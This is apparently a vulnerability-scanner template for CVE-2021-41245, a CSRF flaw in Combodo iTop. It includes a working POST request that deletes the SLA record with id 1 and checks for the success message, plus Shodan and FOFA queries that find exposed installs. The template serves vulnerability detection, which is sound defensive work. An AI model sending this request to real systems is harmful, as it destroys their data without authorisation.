id: CVE-2021-41245

info:
  name: Combodo iTop CSRF Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  description: |
    Combodo iTop is vulnerable to CSRF attacks that allow an attacker to delete Standard SLA. The vulnerability exists due to insufficient CSRF protection in privUITransactionFile. Versions prior to 2.7.6 and 3.0.0 are affected.
  impact: |
    Successful exploitation could lead to unauthorized actions performed on behalf of the user.
  remediation: |
    Implement CSRF tokens and ensure proper validation of requests to prevent CSRF attacks.
  reference:
    - https://github.com/Combodo/iTop/security/advisories/GHSA-33pr-5776-9jqf
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N
    cvss-score: 6.5
    cve-id: CVE-2021-41245
    cwe-id: CWE-352
    epss-score: 0.00175
    epss-percentile: 0.5581
    cpe: cpe:2.3:a:combodo:itop:*:*:*:*:*:*:*:*
  metadata:
    vendor: combodo
    product: itop
    shodan-query: http.html:"installation" html:"itop"
    fofa-query: body="installation" html:"itop"

http:
  - method: POST
    path:
      - "{{BaseURL}}/web/pages/UI.php?operation=delete&class=SLA&id=1&c[menu]=SLA"

    body: |
      transaction_id=admE469.tmp&operation=bulk_delete_confirmed&filter=[SELECT+`SLA`+FROM+`SLA`+AS+`SLA`+WHERE+(`SLA`.`id`+IN+(1))]&class=SLA&selectObject[]=1&c[menu]=SLA

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "Standard SLA deleted successfully"
        part: body
